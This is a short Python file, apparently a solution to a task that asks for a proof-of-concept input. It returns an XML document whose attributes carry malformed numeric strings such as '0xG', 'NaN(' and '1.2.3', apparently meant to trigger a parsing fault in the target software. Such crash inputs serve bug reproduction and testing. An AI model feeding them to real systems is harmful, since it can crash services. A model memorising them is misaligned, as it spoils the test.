import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = (
            b'<?xml version="1.0"?>\n'
            b'<root '
            b'a1="abc" '
            b'a2="++" '
            b'a3="+-1" '
            b'a4="--1" '
            b'a5="0x" '
            b'a6="0xG" '
            b'a7="NaN(" '
            b'a8="Inf+" '
            b'a9="1.2.3" '
            b'a10=" " '
            b'a11="+" '
            b'a12="-" '
            b'/>\n'
        )
        return poc